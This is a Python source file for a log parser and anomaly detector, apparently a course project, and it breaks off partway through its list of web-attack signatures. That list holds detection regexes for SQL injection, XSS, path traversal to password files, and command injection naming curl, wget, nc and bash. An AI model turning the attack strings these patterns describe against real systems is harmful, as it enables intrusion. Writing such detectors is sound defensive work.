#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
===============================================================================
 LogSentry - Multi-Format Security Log Parser & Anomaly Detection Engine
===============================================================================
 Course : CSIT 2033 - Programming for Cybersecurity
 File   : log_parser.py
 Python : 3.8+  (standard library only - no third-party packages required)

 PURPOSE
 -------
 LogSentry ingests security-relevant log files, normalizes wildly different
 formats into a single event schema, runs a battery of threshold-based
 detection analytics over the normalized stream, and emits a formal security
 report containing prioritized alerts, evidence, IOCs and remediation guidance.

 SUPPORTED INPUT FORMATS
 -----------------------
   * Apache / Nginx access logs  (Combined Log Format, Common Log Format,
                                  and vhost-prefixed variants)
   * Apache error logs           ([Wed Oct 11 14:32:52 2023] [error] [client ...])
   * Nginx error logs            (2023/10/11 14:32:52 [error] 1234#0: ...)
   * Syslog RFC 3164             (Oct 11 14:32:52 host sshd[1234]: ...)
   * Syslog RFC 5424             (<34>1 2023-10-11T14:32:52Z host app - - - ...)
   * Linux auth.log / secure     (sshd, sudo, su, useradd, PAM messages)
   * Windows Event Log exports   (Get-WinEvent -> Export-Csv  or  ConvertTo-Json)
   * Gzip-compressed variants of any of the above (*.gz)

 ARCHITECTURE (parsing pipeline)
 -------------------------------
     [ files ]
        |-> Stage 1  SOURCE READER      encoding-safe streaming line reader
        |-> Stage 2  FORMAT DETECTOR    scores sample lines against parsers
        |-> Stage 3  LINE PARSER        named-group regex -> raw field dict
        |-> Stage 4  NORMALIZER         raw fields -> canonical Event record
        |-> Stage 5  ENRICHER           IP classification, URL decoding,
        |                               action/outcome tagging, ordering key
        |-> Stage 6  DETECTION ENGINE   N independent threshold detectors
        |-> Stage 7  CORRELATOR         scoring, dedup, IOC extraction
        \-> Stage 8  REPORTER           console / Markdown / JSON / CSV / HTML

 DETECTION COVERAGE (all threshold-driven, all tunable)
 ------------------------------------------------------
   Authentication : brute force by IP, brute force by account, password
                    spraying, distributed brute force, successful login
                    following failures, invalid-user enumeration,
                    off-hours authentication, sudo abuse
   Web            : SQL injection, XSS, path traversal, command injection,
                    LFI/RFI, web-shell upload, scanner user-agents,
                    directory enumeration, 4xx/5xx bursts, rare HTTP methods
   Volume         : global traffic spikes (robust MAD outlier test),
                    per-source volume outliers, C2-style beaconing,
                    large-transfer / data-exfiltration thresholds
   Host / Windows : privileged logon, account creation, privileged group
                    modification, account lockout, audit log cleared,
                    service installation, explicit-credential use

 USAGE
 -----
   Self-contained demonstration (generates sample logs, runs full pipeline,
   verifies every detector fires - no external data needed):
       py log_parser.py --lab

   Verify parsers and threshold math:
       py log_parser.py --selftest

   Analyze real logs:
       py log_parser.py -i access.log -i /var/log/auth.log --out-dir report
       py log_parser.py -i "C:\\logs\\*.log" --format auto --min-severity MEDIUM
       py log_parser.py -i winevents.csv --format winevent_csv --html

   Tune thresholds:
       py log_parser.py -i auth.log --fail-threshold 3 --fail-window 120

 NOTE ON ETHICS / SCOPE
 ----------------------
 LogSentry is a passive, read-only analysis tool. It never contacts a network,
 never modifies its input, and only ever reads files the operator supplies.
 Analyze only logs you are authorized to access.
===============================================================================
"""

from __future__ import annotations

import argparse
import csv
import fnmatch
import glob
import gzip
import ipaddress
import json
import math
import os
import re
import statistics
import sys
import tempfile
from collections import Counter, defaultdict, deque
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from html import escape as _html_escape
from typing import (Any, Callable, Dict, Iterable, Iterator, List, Optional,
                    Sequence, Set, Tuple)
from urllib.parse import unquote, unquote_plus

TOOL_NAME = "LogSentry"
TOOL_VERSION = "1.0.1"
COURSE = "CSIT 2033 - Programming for Cybersecurity"

# ---------------------------------------------------------------------------
# Locale-independent month table.  strptime("%b") depends on the active locale,
# which silently breaks parsing on non-English systems; a fixed table does not.
# ---------------------------------------------------------------------------
MONTHS: Dict[str, int] = {
    "jan": 1, "feb": 2, "mar": 3, "apr": 4, "may": 5, "jun": 6,
    "jul": 7, "aug": 8, "sep": 9, "oct": 10, "nov": 11, "dec": 12,
}

SEVERITIES = ("INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL")
SEVERITY_RANK: Dict[str, int] = {s: i for i, s in enumerate(SEVERITIES)}
SEVERITY_WEIGHT: Dict[str, float] = {
    "INFO": 0.0, "LOW": 2.0, "MEDIUM": 6.0, "HIGH": 14.0, "CRITICAL": 26.0,
}


# ===========================================================================
# SECTION 1 - TERMINAL / OUTPUT HELPERS
# ===========================================================================
class C:
    """ANSI colour codes.  Disabled automatically when output is redirected."""
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    BRED = "\033[91m"
    BGREEN = "\033[92m"
    BYELLOW = "\033[93m"
    BCYAN = "\033[96m"
    _enabled = True

    @classmethod
    def disable(cls) -> None:
        cls._enabled = False
        for name in dir(cls):
            if name.isupper():
                setattr(cls, name, "")

    @classmethod
    def enabled(cls) -> bool:
        return cls._enabled


SEVERITY_COLOR = {
    "CRITICAL": C.BRED, "HIGH": C.RED, "MEDIUM": C.YELLOW,
    "LOW": C.CYAN, "INFO": C.DIM,
}


def init_terminal(no_color: bool = False) -> None:
    """
    Enable ANSI escape processing on Windows 10+ consoles.

    PowerShell and cmd.exe do not interpret ANSI sequences unless the
    ENABLE_VIRTUAL_TERMINAL_PROCESSING console mode flag is set, so without
    this the report renders as literal escape gibberish on Windows.
    """
    if no_color or not sys.stdout.isatty() or os.environ.get("NO_COLOR"):
        C.disable()
        # SEVERITY_COLOR captured the codes when the module was imported, so it
        # has to be blanked explicitly as well.
        for key in SEVERITY_COLOR:
            SEVERITY_COLOR[key] = ""
        return
    if os.name == "nt":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            # -11 == STD_OUTPUT_HANDLE, 0x0004 == ENABLE_VIRTUAL_TERMINAL_PROCESSING
            handle = kernel32.GetStdHandle(-11)
            mode = ctypes.c_uint32()
            if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                kernel32.SetConsoleMode(handle, mode.value | 0x0004)
            else:
                C.disable()
        except Exception:
            C.disable()
        if not C.enabled():
            for key in SEVERITY_COLOR:
                SEVERITY_COLOR[key] = ""


def hr(char: str = "-", width: int = 78) -> str:
    return char * width


def banner(text: str, color: Optional[str] = None) -> str:
    """
    Note the deliberate `color=None` default.

    Writing `color: str = C.BCYAN` would look equivalent but is not: Python
    evaluates default arguments once, when the function is defined, so the
    escape code would be captured before --no-color ever had a chance to blank
    it and every banner would still emit ANSI codes into a redirected file.
    Reading the attribute at call time is what makes the switch effective.
    """
    return f"{color if color is not None else C.BCYAN}{C.BOLD}{text}{C.RESET}"


def human_bytes(n: Optional[int]) -> str:
    if n is None:
        return "n/a"
    value = float(n)
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if abs(value) < 1024.0 or unit == "TB":
            return f"{value:.1f} {unit}" if unit != "B" else f"{int(value)} B"
        value /= 1024.0
    return f"{value:.1f} TB"


def truncate(text: str, limit: int = 240) -> str:
    text = (text or "").rstrip("\r\n")
    return text if len(text) <= limit else text[: limit - 3] + "..."


def pct(part: float, whole: float) -> float:
    return 0.0 if not whole else (part / whole) * 100.0


# ===========================================================================
# SECTION 2 - CONFIGURATION (every detection threshold lives here)
# ===========================================================================
@dataclass
class Config:
    """
    Central threshold configuration.

    Every number a detector compares against is defined here so that tuning
    is a configuration exercise rather than a code-editing exercise.  Values
    may be overridden by a JSON config file (--config) and then by explicit
    command-line flags, in that order of increasing precedence.
    """
    # --- authentication -----------------------------------------------------
    fail_window: int = 300            # seconds - sliding window for failures
    fail_threshold: int = 5           # failures from one IP -> brute force
    user_fail_threshold: int = 8      # failures against one account
    spray_window: int = 900           # seconds - password spray window
    spray_users: int = 5              # distinct accounts from one IP
    distributed_ips: int = 4          # distinct IPs against one account
    success_after_fail: int = 3       # failures preceding a success
    invalid_user_threshold: int = 5   # distinct invalid usernames from one IP
    lockout_threshold: int = 2        # account lockout events

    # --- sudo / privilege ---------------------------------------------------
    sudo_fail_threshold: int = 3

    # --- web ----------------------------------------------------------------
    http_error_window: int = 60       # seconds
    http_error_threshold: int = 25    # 4xx responses from one IP in window
    server_error_threshold: int = 15  # 5xx responses in window (any source)
    enum_404_threshold: int = 12      # distinct 404 paths from one IP
    web_attack_threshold: int = 1     # signature hits before alerting

    # --- volume / statistics ------------------------------------------------
    spike_bucket: int = 60            # seconds per histogram bucket
    spike_sigma: float = 4.0          # robust (MAD) z-score cut-off
    spike_min_events: int = 20        # a bucket must be at least this big
    ip_volume_sigma: float = 4.0      # per-source volume outlier cut-off
    ip_volume_min: int = 50           # minimum requests to be considered
    rare_ip_error_ratio: float = 0.5  # >=50% errors makes a rare IP suspicious
    rare_ip_min_events: int = 5

    # --- beaconing ----------------------------------------------------------
    beacon_min_events: int = 12
    beacon_min_interval: float = 5.0  # seconds
    beacon_max_jitter: float = 0.15   # stdev/median of inter-arrival deltas

    # --- data transfer ------------------------------------------------------
    exfil_single_bytes: int = 50_000_000       # one response  (~50 MB)
    exfil_total_bytes: int = 250_000_000       # per-source total (~250 MB)

    # --- temporal -----------------------------------------------------------
    business_start_hour: int = 7
    business_end_hour: int = 19
    off_hours_threshold: int = 1

    # --- reporting ----------------------------------------------------------
    max_evidence: int = 4             # sample log lines retained per alert
    top_n: int = 10                   # rows in "top talkers" style tables

    # --- allow-listing ------------------------------------------------------
    allow_ips: List[str] = field(default_factory=list)
    allow_users: List[str] = field(default_factory=list)
    baseline_ips: Set[str] = field(default_factory=set)

    # ---------------------------------------------------------------------
    def load_json(self, path: str) -> None:
        with open(path, "r", encoding="utf-8-sig") as fh:
            data = json.load(fh)
        if not isinstance(data, dict):
            raise ValueError("config file must contain a JSON object")
        for key, value in data.items():
            if not hasattr(self, key):
                warn(f"config: ignoring unknown key '{key}'")
                continue
            current = getattr(self, key)
            if isinstance(current, set):
                setattr(self, key, set(value))
            else:
                setattr(self, key, value)

    def is_allowed_ip(self, ip: Optional[str]) -> bool:
        """Allow-list supports exact IPs, CIDR blocks and glob patterns."""
        if not ip:
            return False
        for entry in self.allow_ips:
            entry = entry.strip()
            if not entry:
                continue
            if entry == ip:
                return True
            if "/" in entry:
                try:
                    if ipaddress.ip_address(ip) in ipaddress.ip_network(entry, strict=False):
                        return True
                except ValueError:
                    pass
            elif ("*" in entry or "?" in entry) and fnmatch.fnmatch(ip, entry):
                return True
        return False

    def is_allowed_user(self, user: Optional[str]) -> bool:
        if not user:
            return False
        low = user.lower()
        return any(low == u.strip().lower() for u in self.allow_users if u.strip())


# ===========================================================================
# SECTION 3 - LOW-LEVEL UTILITIES
# ===========================================================================
_VERBOSE = False


def set_verbose(flag: bool) -> None:
    global _VERBOSE
    _VERBOSE = flag


def info(msg: str) -> None:
    print(f"{C.CYAN}[*]{C.RESET} {msg}")


def good(msg: str) -> None:
    print(f"{C.BGREEN}[+]{C.RESET} {msg}")


def warn(msg: str) -> None:
    print(f"{C.YELLOW}[!]{C.RESET} {msg}", file=sys.stderr)


def error(msg: str) -> None:
    print(f"{C.BRED}[x]{C.RESET} {msg}", file=sys.stderr)


def debug(msg: str) -> None:
    if _VERBOSE:
        print(f"{C.DIM}[.] {msg}{C.RESET}")


def detect_encoding(path: str) -> str:
    """
    Sniff a workable text encoding.

    Windows-generated logs (especially PowerShell redirections and Event Log
    CSV exports) are frequently UTF-16LE with a BOM or legacy cp1252, while
    Linux logs are UTF-8.  Guessing wrong produces either a UnicodeDecodeError
    or a file that appears to contain NUL bytes between every character.
    """
    opener = gzip.open if path.lower().endswith(".gz") else open
    try:
        with opener(path, "rb") as fh:  # type: ignore[operator]
            head = fh.read(65536)
    except OSError:
        return "utf-8"
    if head.startswith(b"\xff\xfe") or head.startswith(b"\xfe\xff"):
        return "utf-16"
    if head.startswith(b"\xef\xbb\xbf"):
        return "utf-8-sig"
    # A high density of NUL bytes at even/odd offsets implies UTF-16 without BOM
    if head and head.count(b"\x00") > len(head) // 4:
        return "utf-16-le"
    for candidate in ("utf-8", "cp1252", "latin-1"):
        try:
            head.decode(candidate)
            return candidate
        except UnicodeDecodeError:
            continue
    return "latin-1"


def read_lines(path: str) -> Iterator[Tuple[int, str]]:
    """Stream (line_number, text) pairs, transparently handling .gz and encoding."""
    encoding = detect_encoding(path)
    opener = gzip.open if path.lower().endswith(".gz") else open
    with opener(path, "rt", encoding=encoding, errors="replace", newline="") as fh:  # type: ignore[operator]
        for idx, line in enumerate(fh, start=1):
            yield idx, line.rstrip("\r\n")


def expand_inputs(patterns: Sequence[str]) -> List[str]:
    """Expand files, directories and glob patterns into a sorted file list."""
    found: List[str] = []
    for pattern in patterns:
        if os.path.isdir(pattern):
            for root, _dirs, files in os.walk(pattern):
                for name in sorted(files):
                    if name.lower().endswith((".log", ".txt", ".csv", ".json", ".gz")):
                        found.append(os.path.join(root, name))
        elif any(ch in pattern for ch in "*?["):
            found.extend(sorted(glob.glob(pattern, recursive=True)))
        elif os.path.isfile(pattern):
            found.append(pattern)
        else:
            warn(f"input not found, skipping: {pattern}")
    # Preserve order while removing duplicates
    seen: Set[str] = set()
    unique: List[str] = []
    for path in found:
        real = os.path.abspath(path)
        if real not in seen:
            seen.add(real)
            unique.append(path)
    return unique


_IPV4_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")


def clean_ip(raw: Optional[str]) -> Optional[str]:
    """
    Normalize an address token into a bare IP string.

    Handles the many shapes real logs use:  '10.0.0.5:54221',
    '[2001:db8::1]:443', '::ffff:10.0.0.5', 'client 10.0.0.5,' and
    X-Forwarded-For chains ('203.0.113.9, 10.0.0.1' -> first hop).
    """
    if not raw:
        return None
    token = raw.strip().strip('"\'').rstrip(",;")
    if not token or token == "-":
        return None
    if "," in token:                      # X-Forwarded-For chain
        token = token.split(",")[0].strip()
    if token.startswith("[") and "]" in token:      # [ipv6]:port
        token = token[1: token.index("]")]
    elif token.count(":") == 1 and _IPV4_RE.match(token.split(":")[0]):
        token = token.split(":")[0]                 # ipv4:port
    if token.lower().startswith("::ffff:"):         # IPv4-mapped IPv6
        token = token[7:]
    try:
        return str(ipaddress.ip_address(token))
    except ValueError:
        return None


# RFC 5737 / RFC 3849 documentation ranges and RFC 6598 carrier-grade NAT.
# These have to be tested explicitly: Python's ipaddress module reports the
# documentation ranges as is_private == True, so labelling purely on that flag
# would print "private" next to 203.0.113.44 and mislead the analyst.
_DOC_NETS = [ipaddress.ip_network(n) for n in
             ("192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24", "2001:db8::/32")]
_CGNAT_NET = ipaddress.ip_network("100.64.0.0/10")


def ip_kind(ip: Optional[str]) -> str:
    """Classify an address so detectors can reason about internal vs external."""
    if not ip:
        return "unknown"
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return "invalid"
    if addr.is_loopback:
        return "loopback"
    if addr.is_link_local:
        return "link-local"
    if addr.is_multicast:
        return "multicast"
    if any(addr in net for net in _DOC_NETS if net.version == addr.version):
        return "documentation"
    if addr.version == 4 and addr in _CGNAT_NET:
        return "cgnat"
    if addr.is_private:
        return "private"
    if addr.is_reserved or addr.is_unspecified:
        return "reserved"
    return "public"


def robust_zscore(value: float, median: float, mad: float) -> float:
    """
    Modified z-score (Iglewicz & Hoaglin).

    The mean/standard-deviation z-score is a poor fit for log volume because
    the attack traffic we are trying to detect inflates both statistics and
    hides itself.  The median and median absolute deviation are resistant to
    that contamination, so a burst cannot mask itself.  0.6745 rescales MAD
    to be comparable with a standard deviation for normal data.
    """
    if mad <= 0:
        return 0.0
    return 0.6745 * (value - median) / mad


def median_abs_deviation(values: Sequence[float]) -> Tuple[float, float]:
    if not values:
        return 0.0, 0.0
    med = statistics.median(values)
    mad = statistics.median([abs(v - med) for v in values])
    return med, mad


def sparkline(counts: Sequence[int], width: int = 60) -> str:
    """Small ASCII histogram used in the timeline section of the report."""
    if not counts:
        return ""
    blocks = " .:-=+*#%@"
    peak = max(counts) or 1
    if len(counts) > width:                       # down-sample by averaging
        step = len(counts) / width
        reduced = []
        for i in range(width):
            chunk = counts[int(i * step): max(int((i + 1) * step), int(i * step) + 1)]
            reduced.append(int(sum(chunk) / len(chunk)) if chunk else 0)
        counts = reduced
    return "".join(blocks[min(len(blocks) - 1, int(c / peak * (len(blocks) - 1)))]
                   for c in counts)


# ===========================================================================
# SECTION 4 - CANONICAL EVENT SCHEMA
# ===========================================================================
@dataclass
class Event:
    """
    One normalized log record.

    Every parser, regardless of input format, produces this same structure.
    Detectors are therefore written once and work across Apache, syslog and
    Windows Event Log sources without modification - this decoupling is the
    entire point of the normalization stage.
    """
    raw: str
    line_no: int
    source_file: str
    source_type: str                                  # parser that produced it
    timestamp: Optional[datetime] = None
    order_key: float = 0.0                            # monotonic sort/window key
    src_ip: Optional[str] = None
    src_kind: str = "unknown"
    host: Optional[str] = None
    user: Optional[str] = None
    process: Optional[str] = None
    category: str = "other"                           # auth | web | system | other
    action: str = "unknown"                           # login_failure, request, ...
    outcome: str = "unknown"                          # success | failure | unknown
    message: str = ""
    # --- HTTP-specific ---
    method: Optional[str] = None
    uri: Optional[str] = None
    uri_decoded: Optional[str] = None
    protocol: Optional[str] = None
    status: Optional[int] = None
    size: Optional[int] = None
    referrer: Optional[str] = None
    user_agent: Optional[str] = None
    # --- Windows-specific ---
    event_id: Optional[int] = None
    logon_type: Optional[str] = None
    provider: Optional[str] = None
    extra: Dict[str, Any] = field(default_factory=dict)

    @property
    def when(self) -> str:
        return self.timestamp.strftime("%Y-%m-%d %H:%M:%S") if self.timestamp else "unknown-time"

    def location(self) -> str:
        return f"{os.path.basename(self.source_file)}:{self.line_no}"


@dataclass
class ParseStats:
    """Bookkeeping so the report can state how much of the input was understood."""
    files: int = 0
    total_lines: int = 0
    blank_lines: int = 0
    parsed: int = 0
    unparsed: int = 0
    unparsed_samples: List[str] = field(default_factory=list)
    by_source_type: Counter = field(default_factory=Counter)
    by_file: Counter = field(default_factory=Counter)

    def note_unparsed(self, path: str, line_no: int, text: str) -> None:
        self.unparsed += 1
        if len(self.unparsed_samples) < 10:
            self.unparsed_samples.append(f"{os.path.basename(path)}:{line_no}: {truncate(text, 120)}")

    @property
    def parse_rate(self) -> float:
        useful = self.total_lines - self.blank_lines
        return pct(self.parsed, useful)


# ===========================================================================
# SECTION 5 - REGULAR EXPRESSION LIBRARY
# ===========================================================================
# Every pattern uses named capture groups so the parser reads as field
# extraction rather than as index arithmetic over match.group(n).
# ---------------------------------------------------------------------------

# --- Apache/Nginx access logs ---------------------------------------------
RE_ACCESS_COMBINED = re.compile(
    r'^(?:(?P<vhost>\S+)\s+)?'                       # optional vhost prefix
    r'(?P<ip>\S+)\s+'                                # remote host
    r'(?P<ident>\S+)\s+'                             # RFC1413 identity (usually -)
    r'(?P<user>\S+)\s+'                              # HTTP auth user (usually -)
    r'\[(?P<ts>[^\]]+)\]\s+'                         # [10/Oct/2023:13:55:36 -0500]
    r'"(?P<request>(?:[^"\\]|\\.)*)"\s+'             # "GET /index.html HTTP/1.1"
    r'(?P<status>\d{3})\s+'                          # 200
    r'(?P<size>\d+|-)'                               # 2326 or -
    r'(?:\s+"(?P<referrer>(?:[^"\\]|\\.)*)"'         # optional "referrer"
    r'\s+"(?P<agent>(?:[^"\\]|\\.)*)")?'             # optional "user-agent"
    r'(?P<trailing>.*)$'
)

RE_REQUEST = re.compile(
    r'^(?P<method>[A-Z_]{3,12})\s+(?P<uri>\S+)(?:\s+(?P<proto>HTTP/[\d.]+))?$'
)

RE_APACHE_TS = re.compile(
    r'^(?P<day>\d{1,2})/(?P<mon>[A-Za-z]{3})/(?P<year>\d{4}):'
    r'(?P<h>\d{2}):(?P<m>\d{2}):(?P<s>\d{2})'
    r'(?:\s+(?P<tz>[+-]\d{4}))?$'
)

# --- Apache error log ------------------------------------------------------
RE_APACHE_ERROR = re.compile(
    r'^\[(?P<ts>[A-Za-z]{3}\s+[A-Za-z]{3}\s+\d{1,2}\s+[\d:.]+\s+\d{4})\]\s+'
    r'\[(?P<mod>[^\]]*)\]\s*'
    r'(?:\[pid\s+(?P<pid>\d+)(?::tid\s+\d+)?\]\s*)?'
    r'(?:\[client\s+(?P<client>[^\]]+)\]\s*)?'
    r'(?P<msg>.*)$'
)
RE_APACHE_ERR_TS = re.compile(
    r'^[A-Za-z]{3}\s+(?P<mon>[A-Za-z]{3})\s+(?P<day>\d{1,2})\s+'
    r'(?P<h>\d{2}):(?P<m>\d{2}):(?P<s>\d{2})(?:\.\d+)?\s+(?P<year>\d{4})$'
)

# --- Nginx error log -------------------------------------------------------
RE_NGINX_ERROR = re.compile(
    r'^(?P<ts>\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2})\s+'
    r'\[(?P<level>\w+)\]\s+(?P<pid>\d+)#(?P<tid>\d+):\s*(?P<msg>.*)$'
)
RE_NGINX_CLIENT = re.compile(r'client:\s*(?P<ip>[0-9a-fA-F.:]+)')
RE_NGINX_REQUEST = re.compile(r'request:\s*"(?P<request>[^"]*)"')

# --- Syslog RFC 3164 -------------------------------------------------------
RE_SYSLOG_3164 = re.compile(
    r'^(?:<(?P<pri>\d{1,3})>)?'
    r'(?P<mon>[A-Za-z]{3})\s+(?P<day>\d{1,2})\s+'
    r'(?P<h>\d{2}):(?P<m>\d{2}):(?P<s>\d{2})\s+'
    r'(?P<host>[\w.\-]+)\s+'
    r'(?P<proc>[\w\-./]+?)(?:\[(?P<pid>\d+)\])?:\s*'
    r'(?P<msg>.*)$'
)

# --- Syslog RFC 5424 -------------------------------------------------------
RE_SYSLOG_5424 = re.compile(
    r'^<(?P<pri>\d{1,3})>(?P<ver>\d)\s+'
    r'(?P<ts>\S+)\s+(?P<host>\S+)\s+(?P<app>\S+)\s+'
    r'(?P<pid>\S+)\s+(?P<msgid>\S+)\s+'
    r'(?P<sd>(?:\[[^\]]*\])+|-)\s*(?P<msg>.*)$'
)

# --- Authentication message signatures (matched against syslog message bodies)
AUTH_PATTERNS: List[Tuple[str, str, str, re.Pattern]] = [
    # (action, outcome, note, pattern)
    ("login_failure", "failure", "ssh_password",
     re.compile(r'Failed (?:password|keyboard-interactive/pam) for (?:invalid user )?'
                r'(?P<user>[^\s]+) from (?P<ip>[0-9a-fA-F.:]+)')),
    ("login_failure", "failure", "ssh_invalid_user",
     re.compile(r'Invalid user (?P<user>[^\s]+) from (?P<ip>[0-9a-fA-F.:]+)')),
    ("login_failure", "failure", "ssh_no_identification",
     re.compile(r'Did not receive identification string from (?P<ip>[0-9a-fA-F.:]+)')),
    ("login_failure", "failure", "ssh_max_attempts",
     re.compile(r'error: maximum authentication attempts exceeded for (?:invalid user )?'
                r'(?P<user>[^\s]+) from (?P<ip>[0-9a-fA-F.:]+)')),
    # NOTE: the sudo/su patterns must be tested BEFORE the generic PAM pattern.
    # A sudo failure line also contains "authentication failure;", so if the
    # generic rule ran first every sudo failure would be misfiled as a login
    # failure and would inflate the brute-force counters.
    ("sudo_failure", "failure", "sudo_auth",
     re.compile(r'pam_unix\(sudo:auth\): authentication failure;.*?user=(?P<user>\S+)')),
    ("sudo_failure", "failure", "sudo_incorrect",
     re.compile(r'(?P<user>\S+)\s*:\s*(?:\d+ )?incorrect password attempts?')),
    ("su_failure", "failure", "su_failed",
     re.compile(r'FAILED SU \(to (?P<target>\S+)\)\s+(?P<user>\S+)')),
    ("login_failure", "failure", "pam_auth_failure",
     re.compile(r'authentication failure;.*?(?:ruser=(?P<ruser>\S*))?.*?rhost=(?P<ip>[0-9a-fA-F.:]*)'
                r'(?:\s+user=(?P<user>\S+))?')),
    ("login_success", "success", "ssh_accepted",
     re.compile(r'Accepted (?:password|publickey|keyboard-interactive/pam) for '
                r'(?P<user>[^\s]+) from (?P<ip>[0-9a-fA-F.:]+)')),
    ("login_success", "success", "session_opened",
     re.compile(r'pam_unix\([^)]*:session\): session opened for user (?P<user>[\w.\-$]+)')),
    ("sudo_command", "success", "sudo_exec",
     re.compile(r'(?P<user>\S+)\s*:\s*TTY=\S+\s*;\s*PWD=\S+\s*;\s*USER=(?P<target>\S+)\s*;\s*'
                r'COMMAND=(?P<command>.*)$')),
    ("account_created", "success", "useradd",
     re.compile(r'new user: name=(?P<user>[^,]+)')),
    ("group_modified", "success", "usermod_group",
     re.compile(r"add '(?P<user>[^']+)' to (?:shadow )?group '(?P<group>[^']+)'")),
    ("account_lockout", "failure", "pam_faillock",
     re.compile(r'pam_faillock.*?user=(?P<user>\S+)')),
    ("log_cleared", "success", "audit_stop",
     re.compile(r'(?:audit|rsyslog)d?.*?(?:halted|stopped|log file cleared)', re.IGNORECASE)),
]

RE_IP_ANY = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')

# --- Windows Event Log message field extraction ----------------------------
RE_WIN_ACCOUNT = re.compile(r'Account Name:\s*(?P<v>[^\r\n\t]+)')
RE_WIN_SRC_ADDR = re.compile(r'Source Network Address:\s*(?P<v>[^\r\n\t]+)')
RE_WIN_WORKSTATION = re.compile(r'Workstation Name:\s*(?P<v>[^\r\n\t]+)')
RE_WIN_LOGON_TYPE = re.compile(r'Logon Type:\s*(?P<v>\d+)')
RE_WIN_STATUS = re.compile(r'(?:Failure Reason|Status):\s*(?P<v>[^\r\n]+)')
RE_WIN_SERVICE = re.compile(r'Service (?:File )?Name:\s*(?P<v>[^\r\n\t]+)')
RE_WIN_TARGET_ACCOUNT = re.compile(
    r'(?:New Account|Target Account|Member):[\s\S]{0,200}?Account Name:\s*(?P<v>[^\r\n\t]+)')
RE_WIN_ISO_TS = re.compile(
    r'(?P<year>\d{4})-(?P<mon>\d{2})-(?P<day>\d{2})[T ]'
    r'(?P<h>\d{2}):(?P<m>\d{2}):(?P<s>\d{2})')
RE_WIN_US_TS = re.compile(
    r'(?P<mon>\d{1,2})/(?P<day>\d{1,2})/(?P<year>\d{4})\s+'
    r'(?P<h>\d{1,2}):(?P<m>\d{2}):(?P<s>\d{2})\s*(?P<ampm>[AaPp][Mm])?')

# Windows Security / System event IDs that carry security meaning.
WIN_EVENT_MEANING: Dict[int, Tuple[str, str, str]] = {
    # id: (action, outcome, description)
    4624: ("login_success", "success", "An account was successfully logged on"),
    4625: ("login_failure", "failure", "An account failed to log on"),
    4634: ("logoff", "success", "An account was logged off"),
    4647: ("logoff", "success", "User initiated logoff"),
    4648: ("explicit_creds", "success", "Logon attempted using explicit credentials"),
    4672: ("privileged_logon", "success", "Special privileges assigned to new logon"),
    4720: ("account_created", "success", "A user account was created"),
    4722: ("account_enabled", "success", "A user account was enabled"),
    4723: ("password_change", "success", "An attempt was made to change a password"),
    4724: ("password_reset", "success", "An attempt was made to reset a password"),
    4725: ("account_disabled", "success", "A user account was disabled"),
    4726: ("account_deleted", "success", "A user account was deleted"),
    4728: ("group_modified", "success", "Member added to a security-enabled global group"),
    4732: ("group_modified", "success", "Member added to a security-enabled local group"),
    4756: ("group_modified", "success", "Member added to a security-enabled universal group"),
    4740: ("account_lockout", "failure", "A user account was locked out"),
    4776: ("login_failure", "failure", "Credential validation (NTLM)"),
    4719: ("audit_policy_changed", "success", "System audit policy was changed"),
    1102: ("log_cleared", "success", "The audit log was cleared"),
    4688: ("process_created", "success", "A new process has been created"),
    4697: ("service_installed", "success", "A service was installed in the system"),
    7045: ("service_installed", "success", "A service was installed in the system"),
    5140: ("share_access", "success", "A network share object was accessed"),
    4698: ("task_created", "success", "A scheduled task was created"),
}

# --- Web attack signatures -------------------------------------------------
# Each entry: (signature name, compiled pattern, severity, MITRE technique)
WEB_ATTACK_SIGNATURES: List[Tuple[str, re.Pattern, str, str]] = [
    ("SQL Injection - UNION SELECT",
     re.compile(r'union[\s/*]+(all[\s/*]+)?select', re.IGNORECASE), "CRITICAL", "T1190"),
    ("SQL Injection - tautology",
     re.compile(r"(?:'|%27|\")\s*(?:or|and)\s*(?:'?\d+'?\s*=\s*'?\d+|'[^']*'\s*=\s*'[^']*')",
                re.IGNORECASE), "CRITICAL", "T1190"),
    ("SQL Injection - stacked query / DROP",
     re.compile(r';\s*(?:drop|delete|update|insert|truncate|exec)\s+', re.IGNORECASE),
     "CRITICAL", "T1190"),
    ("SQL Injection - information_schema probe",
     re.compile(r'information_schema|sysobjects|pg_catalog\.pg_tables', re.IGNORECASE),
     "HIGH", "T1190"),
    ("SQL Injection - time-based blind",
     re.compile(r'(?:sleep\s*\(\s*\d+|benchmark\s*\(|waitfor\s+delay|pg_sleep\s*\()',
                re.IGNORECASE), "CRITICAL", "T1190"),
    ("Cross-Site Scripting - script tag",
     re.compile(r'<\s*script[\s>]|<\s*/\s*script\s*>', re.IGNORECASE), "HIGH", "T1059.007"),
    ("Cross-Site Scripting - event handler",
     re.compile(r'\bon(?:error|load|mouseover|focus|click)\s*=', re.IGNORECASE),
     "HIGH", "T1059.007"),
    ("Cross-Site Scripting - javascript URI",
     re.compile(r'javascript\s*:|data:text/html', re.IGNORECASE), "MEDIUM", "T1059.007"),
    ("Path Traversal",
     re.compile(r'(?:\.\./|\.\.\\){2,}|/etc/(?:passwd|shadow)|\\windows\\win\.ini|boot\.ini',
                re.IGNORECASE), "HIGH", "T1083"),
    ("Local/Remote File Inclusion",
     re.compile(r'(?:php|data|file|expect|zip)://|(?:\?|&)(?:file|page|include|template|path)='
                r'(?:https?%3a|https?:)//', re.IGNORECASE), "HIGH", "T1505.003"),
    ("Command Injection",
     re.compile(r'(?:;|\||`|\$\(|%0a)\s*(?:cat|ls|id|whoami|uname|wget|curl|nc|bash|sh|powershell)\b',
                re.IGNORECASE), "CRITICAL", "T1059"),
    ("Web Shell access",
